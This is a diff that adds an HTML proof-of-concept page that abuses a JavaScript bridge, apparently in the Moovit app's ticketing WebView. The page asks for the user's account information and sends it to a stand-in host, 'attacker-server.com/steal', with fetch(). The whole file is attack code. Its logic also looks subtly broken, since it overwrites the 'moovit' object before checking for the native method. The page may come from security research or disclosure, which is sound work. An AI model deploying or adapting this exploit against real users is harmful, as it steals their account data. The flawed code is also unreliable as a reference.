@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Moovit Account Exfiltration</title>
+</head>
+<body>
+    <h1>Exfiltrating Data...</h1>
+    <div id="log">Status: Initializing...</div>
+
+    <script>
+        const logDiv = document.getElementById('log');
+
+        // 1. Define the callback function that the native app will call
+        window.moovit = {
+            onAccountInfo: function(jsonString) {
+                const data = JSON.parse(jsonString);
+                logDiv.innerHTML = "<b>SUCCESS! Account Data Exfiltrated:</b><br>" + 
+                                   JSON.stringify(data, null, 2);
+                
+                // 3. Exfiltrate to attacker server
+                fetch('https://attacker-server.com/steal?data=' + encodeURIComponent(jsonString));
+            }
+        };
+
+        // 2. Trigger the native interface
+        setTimeout(() => {
+            if (window.moovit && typeof window.moovit.requestAccountInfo === 'function') {
+                logDiv.innerText = "Status: Interface detected. Requesting data...";
+                window.moovit.requestAccountInfo();
+            } else {
+                logDiv.innerText = "Error: 'moovit' interface not found. This page must be loaded in the Ticketing WebView.";
+            }
+        }, 1000);
+    </script>
+</body>
+</html>
